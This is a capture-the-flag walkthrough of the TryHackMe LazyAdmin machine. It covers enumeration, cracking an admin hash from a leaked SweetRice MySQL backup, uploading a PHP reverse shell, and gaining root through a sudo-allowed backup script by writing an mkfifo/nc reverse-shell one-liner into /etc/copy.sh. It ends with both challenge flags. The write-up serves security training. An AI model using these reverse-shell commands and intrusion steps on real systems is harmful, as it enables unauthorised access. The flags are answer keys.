# LazyAdmin

Easy linux machine to practice your skills

[LazyAdmin](https://tryhackme.com/room/lazyadmin)

## Topic's

- Network Enumeration
- Web Enumeration
- Backup Poking
- Brute Forcing (Hash)
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Lazy Admin

Have some fun! There might be multiple ways to get user access.

`Note: It might take 2-3 minutes for the machine to boot`

```
kali@kali:~/CTFs/tryhackme/LazyAdmin$ sudo nmap -A -sS -sC -sV -O 10.10.230.157
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 18:57 CEST
Nmap scan report for 10.10.230.157
Host is up (0.061s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=33945%PV=Y%DS=2%DC=T%G=Y%TM=5F872E
OS:0B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=B)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   72.64 ms 10.8.0.1
2   72.70 ms 10.10.230.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.74 seconds
```

```
kali@kali:~/CTFs/tryhackme/LazyAdmin$ sudo /opt/dirsearch/dirsearch.py -u 10.10.230.157 -w /usr/share/dirb/wordlists/common.txt -e html,php

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4613

Error Log: /opt/dirsearch/logs/errors-20-10-14_18-58-34.log

Target: 10.10.230.157

Output File: /opt/dirsearch/reports/10.10.230.157/_20-10-14_18-58-34.txt

[18:58:34] Starting:
[18:58:39] 301 -  316B  - /content  ->  http://10.10.230.157/content/
[18:58:41] 200 -   11KB - /index.html
[18:58:45] 403 -  278B  - /server-status

Task Completed
```

[http://10.10.230.157/content/](http://10.10.230.157/content/)

![](./2020-10-14_18-59.png)

```
Welcome to SweetRice - Thank your for install SweetRice as your website management system.
This site is building now , please come late.

If you are the webmaster,please go to Dashboard -> General -> Website setting

and uncheck the checkbox "Site close" to open your website.

More help at Tip for Basic CMS SweetRice installed
```

```
kali@kali:~/CTFs/tryhackme/LazyAdmin$ sudo /opt/dirsearch/dirsearch.py -u 10.10.230.157/content -w /usr/share/dirb/wordlists/common.txt -e html,php
[sudo] password for kali:

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4613

Error Log: /opt/dirsearch/logs/errors-20-10-14_19-01-38.log

Target: 10.10.230.157/content

Output File: /opt/dirsearch/reports/10.10.230.157/content_20-10-14_19-01-38.txt

[19:01:38] Starting:
[19:01:39] 301 -  324B  - /content/_themes  ->  http://10.10.230.157/content/_themes/
[19:01:42] 301 -  319B  - /content/as  ->  http://10.10.230.157/content/as/
[19:01:42] 301 -  327B  - /content/attachment  ->  http://10.10.230.157/content/attachment/
[19:01:47] 301 -  323B  - /content/images  ->  http://10.10.230.157/content/images/
[19:01:48] 301 -  320B  - /content/inc  ->  http://10.10.230.157/content/inc/
[19:01:48] 200 -    2KB - /content/index.php
[19:01:48] 301 -  319B  - /content/js  ->  http://10.10.230.157/content/js/

Task Completed
```

LOGIN: [http://10.10.230.157/content/as/](http://10.10.230.157/content/as/)

[http://10.10.230.157/content/inc/](http://10.10.230.157/content/inc/)

[http://10.10.230.157/content/inc/mysql_backup/](http://10.10.230.157/content/inc/mysql_backup/)

```sql
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

`42f749ade7f9e195bf475f37a44cafcb md5 Password123`

`manager:Password123`

[http://10.10.230.157/content/as/?type=media_center](http://10.10.230.157/content/as/?type=media_center)

`http://10.10.230.157/content/attachment/php-reverse-shell.phtml`

```
kali@kali:~/CTFs/tryhackme/LazyAdmin$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.230.157] 55546
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 20:09:00 up 13 min,  0 users,  load average: 0.01, 0.08, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /home
$ ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9002 >/tmp/f' >/etc/copy.sh
$ sudo /usr/bin/perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory
```

```
kali@kali:~/CTFs/tryhackme/LazyAdmin$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.230.157] 58634
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

1. What is the user flag?

`THM{63e5bce9271952aad1113b6f1ac28a07}`

2. What is the root flag?

`THM{6637f41d0177b6f37cb20d775124699f}`
